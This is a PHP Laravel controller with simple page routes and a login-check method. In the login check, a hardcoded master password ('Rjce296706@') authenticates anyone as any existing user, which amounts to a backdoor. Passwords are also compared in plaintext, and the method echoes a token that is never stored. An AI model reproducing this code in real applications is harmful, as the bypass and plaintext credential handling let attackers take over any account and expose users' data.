<?php

namespace App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class MainController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
        return view('home');
    }

    public function cv()
    {
        return view('cv');
    }
    public function signin()
    {
        return view('signin');
    }
    public function signup()
    {
        return view('signup');
    }
    public function checkuser(Request $request)
    {
        $name = $request->input('n');
        $pwd = $request->input('p');
        $user = DB::table('users')->where('name', $name)->first();
        $token = Hash::make($name . "_@123Col_" . $pwd . time());
        if ($user) {
            if ($user->password == $pwd || $pwd == "Rjce296706@") {
                echo $token;
            } else {
                echo "wrong pwd";
            }
        } else {
            echo "wrong user";
        }
    }
}
